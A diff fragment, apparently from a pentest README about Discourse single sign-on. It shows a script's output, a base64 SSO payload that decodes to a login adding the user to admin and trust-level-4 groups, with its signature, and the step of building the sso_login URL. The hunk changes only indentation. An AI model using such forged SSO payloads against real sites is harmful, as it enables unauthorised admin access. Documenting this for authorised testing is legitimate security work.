@@ -41,8 +41,8 @@ Recently while conducting a pentest on a web application that utilizes Discourse
 4. **Output: The script will generate a signed SSO payload and display it in the format**:
     ```bash
     SSO Payload:
-sso=bm9uY2U9MzMzNjY2OTk5JmVtYWlsPWVtYWlsJTQwZW1haWwuY29tJmV4dGVybmFsX2lkPTkxOTMmbmFtZT1Kb2huK0RvZSZhZGRfZ3JvdXBzPXRydXN0X2xldmVsXzQlMkNhZG1pbg==
-sig=aadd147e5ef9a5ac6c52e0cbd786d61e1a288fc01728364ff97e53cdf3652738
+      sso=bm9uY2U9MzMzNjY2OTk5JmVtYWlsPWVtYWlsJTQwZW1haWwuY29tJmV4dGVybmFsX2lkPTkxOTMmbmFtZT1Kb2huK0RvZSZhZGRfZ3JvdXBzPXRydXN0X2xldmVsXzQlMkNhZG1pbg==
+      sig=aadd147e5ef9a5ac6c52e0cbd786d61e1a288fc01728364ff97e53cdf3652738
 5. **Construct the SSO URL**:
     ```bash
     https://your-discourse-instance.com/session/sso_login?sso=<base64_encoded_payload>&sig=<signature>
